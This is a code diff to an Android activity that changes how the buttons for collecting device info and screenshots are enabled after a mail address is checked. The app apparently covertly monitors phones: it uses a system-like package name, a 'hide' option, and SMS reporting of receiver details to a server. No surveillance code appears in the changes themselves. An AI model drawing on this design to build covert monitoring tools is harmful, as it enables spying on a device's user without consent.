@@ -5,6 +5,8 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import android.app.Activity;
 import android.content.Context;
@@ -27,6 +29,7 @@ import system.service.feature.sms.SmsCtrl;
 
 import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.FileCtrl;
+import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
 
@@ -96,21 +99,24 @@ public class InitActivity extends Activity
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) 
     {
-    	if (resultCode == RESULT_OK) 
+    	// Enable buttons if the mail address is valid
+		Pattern p = Pattern.compile(StrUtils.REGEXP_MAIL);
+		String mailAddr = GlobalPrefActivity.getMail(getApplicationContext());
+	    if (mailAddr.length() > 0) {
+	    	Matcher matcher = p.matcher(mailAddr);
+   	 		if (matcher.matches()) {
+   	 			btn_getinfo.setEnabled(true);
+   	 			btn_screenshot.setEnabled(true);
+   	 			hint_getinfo.setEnabled(true);
+   	 			hint_screenshot.setEnabled(true);
+   	 		}
+	    }
+	    
+    	//if (resultCode == RESULT_OK) 
     	{
-			// Enable buttons if the mail address is valid
-			boolean isValidMailAddress = data.getExtras().getBoolean(GlobalPrefActivity.IS_VALID_MAIL_ADDRESS);
-			if (isValidMailAddress) {
-				btn_getinfo.setEnabled(true);
-				btn_screenshot.setEnabled(true);
-				btn_hide.setEnabled(true);
-				hint_getinfo.setEnabled(true);
-				hint_screenshot.setEnabled(true);
-				hint_hide.setEnabled(true);
-			}
-			
-			// Send the receiver info SMS to server to update record in database
-			boolean hasChangedReceiverInfo = data.getExtras().getBoolean(GlobalPrefActivity.HAS_CHG_RECEIVER_INFO);
+    		// Send the receiver info SMS to server to update record in database
+			//boolean hasChangedReceiverInfo = data.getExtras().getBoolean(GlobalPrefActivity.HAS_CHG_RECEIVER_INFO);
+			boolean hasChangedReceiverInfo = GlobalPrefActivity.RECEIVER_INFO_CHANGED;
 			boolean hasBeenLicensed = (ConfigCtrl.getLicenseType(context) != LICENSE_TYPE.NOT_LICENSED);
 			if (hasChangedReceiverInfo && hasBeenLicensed) {
 				SmsCtrl.sendReceiverInfoSms(getApplicationContext());
@@ -210,6 +216,9 @@ public class InitActivity extends Activity
             public void onClick(View v)
             {
             	Intent intent = new Intent().setClass(getBaseContext(), GlobalPrefActivity.class);
+            	//Bundle bundle = new Bundle();
+            	//bundle.putBoolean(GlobalPrefActivity.HAS_CHG_RECEIVER_INFO, false);
+            	//intent.putExtras(bundle);
             	startActivityForResult(intent, R.layout.init);
             }
         };
